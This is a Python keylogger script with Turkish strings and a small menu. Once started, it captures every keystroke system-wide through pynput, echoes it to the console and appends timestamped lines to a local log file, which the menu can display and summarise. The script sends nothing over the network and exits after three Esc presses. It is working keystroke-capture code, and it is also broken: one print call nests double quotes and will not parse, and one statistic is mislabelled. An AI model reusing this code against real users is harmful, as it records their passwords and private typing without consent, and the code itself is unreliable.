#!/usr/bin/env python3

import keyboard
import datetime
import time
import os
import threading
from pynput import keyboard as pynput_keyboard

class SafeKeylogger:
    
    def __init__(self, log_file="logs/tus_kayitlari.txt"):
        self.log_file = log_file
        self.running = True
        self.buffer = []
        
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        
        # Başlangıç mesajı
        self.yaz_log(f"\n{'='*50}")
        self.yaz_log(f"KEYLOGGER BAŞLATILDI: {datetime.datetime.now()}")
        self.yaz_log(f"{'='*50}\n")
    
    def yaz_log(self, text):
        """Log dosyasına yaz"""
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(text + '\n')
    
    def tus_basildi(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                tus = key.char
                self.buffer.append(tus)
                print(tus, end='', flush=True)
                
            else:
                ozel_tuslar = {
                    'Key.space': ' ',
                    'Key.enter': '\n[ENTER]\n',
                    'Key.tab': '\t',
                    'Key.backspace': '[BACKSPACE]',
                    'Key.shift': '[SHIFT]',
                    'Key.ctrl_l': '[CTRL]',
                    'Key.ctrl_r': '[CTRL]',
                    'Key.alt_l': '[ALT]',
                    'Key.alt_r': '[ALT]',
                    'Key.cmd': '[WIN]',
                    'Key.esc': '[ESC]',
                    'Key.up': '[UP]',
                    'Key.down': '[DOWN]',
                    'Key.left': '[LEFT]',
                    'Key.right': '[RIGHT]'
                }
                
                tus_adi = str(key)
                if tus_adi in ozel_tuslar:
                    tus = ozel_tuslar[tus_adi]
                else:
                    tus = f'[{tus_adi.replace("Key.", "")}]'
                
                self.buffer.append(tus)
                if tus == '\n[ENTER]\n':
                    satir = ''.join(self.buffer[:-1])
                    self.yaz_log(f"[{datetime.datetime.now()}] {satir}")
                    self.buffer = []
                print(tus, end='', flush=True)
        except Exception as e:
            print(f"\n[!] Hata: {e}")
    
    def tus_birakildi(self, key):
        pass
    
    def baslat(self):
        """Keylogger'ı başlat"""
        print("\n" + "="*50)
        print("çıkış için lütfen 3 kere "esc" butona basın")
        print("="*50 + "\n")
        
        with pynput_keyboard.Listener(
            on_press=self.tus_basildi,
            on_release=self.tus_birakildi
        ) as listener:
            esc_count = 0
            while self.running:
                if keyboard.is_pressed('esc'):
                    esc_count += 1
                    if esc_count >= 3:
                        print("\n\n[!] çıkış yapılıyor")
                        self.running = False
                        self.yaz_log(f"\n{'='*50}")
                        self.yaz_log(f"durdu: {datetime.datetime.now()}")
                        self.yaz_log(f"{'='*50}\n")
                        break
                    time.sleep(0.5)
                else:
                    esc_count = 0
                time.sleep(0.1)
            listener.stop()
        print(f"\n log dosya: {self.log_file}")
class KeyloggerAnaliz:
    @staticmethod
    def log_oku(dosya_yolu):
        if not os.path.exists(dosya_yolu):
            print("log dosya bulamadım !")
            return None
        with open(dosya_yolu, 'r', encoding='utf-8') as f:
            return f.read()
    @staticmethod
    def istatistik_goster(dosya_yolu):
        log = KeyloggerAnaliz.log_oku(dosya_yolu)
        if log:
            print("\n" + "="*50)
            print("logger sistem")
            print("="*50)
            print(f"toplam karakter: {len(log)}")
            print(f"satır sayı: {log.count(chr(10))}")
            print(f"saat: {log.count('[')}")
def main():
    print("""
      keylogger sistem aktif
    """)
    print("Seçenekler:")
    print("1. logger başlat")
    print("2. logger görüntüle")
    print("3. istatistik göörüntüle")
    print("4. Çıkış")
    
    secim = input("\n seçiniz lütfen (1-4): ")
    
    if secim == "1":
        keylogger = SafeKeylogger()
        try:
            keylogger.baslat()
        except KeyboardInterrupt:
            print("\n\n[!] ele durduldu.")
    
    elif secim == "2":
        log = KeyloggerAnaliz.log_oku("logs/tus_kayitlari.txt")
        if log:
            print("\n" + "="*50)
            print("içerik")
            print("="*50)
            print(log)
    elif secim == "3":
        KeyloggerAnaliz.istatistik_goster("logs/tus_kayitlari.txt")
    
    elif secim == "4":
        print("Çıkış yaptım")
    
    else:
        print("yanlış seçim!")
if __name__ == "__main__":
    main()
